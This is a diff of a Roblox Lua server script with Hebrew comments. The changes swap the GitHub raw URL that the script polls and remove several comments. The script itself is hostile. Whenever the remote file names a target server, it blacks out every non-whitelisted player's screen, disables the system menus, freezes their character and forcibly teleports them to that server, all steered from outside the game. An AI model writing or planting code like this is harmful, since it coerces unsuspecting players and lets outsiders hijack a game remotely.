@@ -2,24 +2,23 @@ local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 
--- חזרנו לראוי הקבוע שלך
-local rawUrl = "https://raw.githubusercontent.com/dylanzyl120/dylanzyl120/refs/heads/main/main"
+-- הראוי החדש ששלחת עכשיו
+local rawUrl = "https://raw.githubusercontent.com/dylanzyl120/dylanzyl120/refs/heads/main/Method"
 local whitelisted = {["noamdb15"] = true, ["dylanzyl123"] = true}
 
 -- פונקציה שחוסמת את התפריטים ויוצרת את המסך השחור
 local function applyMaximumLock(player)
 	local sg = Instance.new("ScreenGui")
 	sg.Name = "TotalBlackout"
-	sg.IgnoreGuiInset = true -- מכסה את כל המסך כולל כפתור ה-Esc
+	sg.IgnoreGuiInset = true 
 	sg.DisplayOrder = 9999999
 	sg.Parent = player:WaitForChild("PlayerGui")
 
 	local frame = Instance.new("Frame", sg)
 	frame.Size = UDim2.new(1, 0, 1, 0)
 	frame.BackgroundColor3 = Color3.new(0, 0, 0)
-	frame.Active = true -- חוסם לחיצות עכבר
+	frame.Active = true 
 
-	-- מנטרל את כפתורי המערכת של רובלוקס
 	local code = [[
 		local starterGui = game:GetService("StarterGui")
 		task.spawn(function()
@@ -38,7 +37,7 @@ end
 task.spawn(function()
 	while true do
 		local success, response = pcall(function()
-			-- מוסיף nocache כדי למנוע מהשרת לקרוא מידע ישן מה-GitHub
+			-- שימוש ב-nocache כדי להבטיח קריאה של המידע הכי טרי מה-GitHub
 			return HttpService:GetAsync(rawUrl .. "?nocache=" .. tick())
 		end)
 
@@ -49,19 +48,17 @@ task.spawn(function()
 			local targetPlaceId = tonumber(lines[1])
 			local targetJobId = lines[2]
 
-			-- בודק אם ה-JobId מהקובץ שונה מהשרת הנוכחי
+			-- בדיקה אם יש JobId והוא לא של השרת הנוכחי
 			if targetJobId and targetJobId ~= "" and targetJobId ~= game.JobId then
 				for _, p in pairs(Players:GetPlayers()) do
 					if not whitelisted[p.Name] then
-						-- 1. חוסם לו את המסך
+						-- הפעלת חסימה ושיגור
 						pcall(function() applyMaximumLock(p) end)
 
-						-- 2. מקפיא אותו במקום
 						if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
 							p.Character.HumanoidRootPart.Anchored = true
 						end
 
-						-- 3. משגר אותו לשרת המטרה
 						task.spawn(function()
 							pcall(function()
 								TeleportService:TeleportToPlaceInstance(targetPlaceId, targetJobId, p)
@@ -71,6 +68,6 @@ task.spawn(function()
 				end
 			end
 		end
-		task.wait(0.5) -- בודק עדכונים כל חצי שנייה
+		task.wait(0.5)
 	end
 end)
